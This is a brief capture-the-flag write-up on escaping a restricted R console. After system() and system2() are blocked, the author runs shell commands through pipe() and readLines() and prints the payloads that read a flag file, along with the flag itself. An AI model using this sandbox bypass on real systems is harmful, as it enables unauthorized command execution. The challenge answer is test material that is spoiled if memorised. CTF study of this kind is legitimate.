---
layout: default
title: R-Code-Execution
---
In this challenge we simply get R console.

![[Pasted image 20260310215443.png]]

I tried to use the functions `system` and `system2`, both gave me the same message:
```
System is forbiden young hacker !
```

So, I googled and found this snippet. It pipes the output of the command `id` that is being executed on the shell, to the object `con`, which is then being read by the function and printed out.

```R
con <- pipe("id")
readLines(con)
close(con)
```

This is the shorter payload, without the `con` object:
```R
readLines(pipe("id"))
```

![[Pasted image 20260310215629.png]]

Okay, now let's look for `.passwd`

After long journey of navigating through the file system, I found this `/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt`.

So, our final payload:

```R
readLines(pipe("cat /home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt"))
```

![[Pasted image 20260310223913.png]]

and the flag is **C0nGr47ul4T10n_y0u_ll_H4v3_A_G00d_Gr4D3**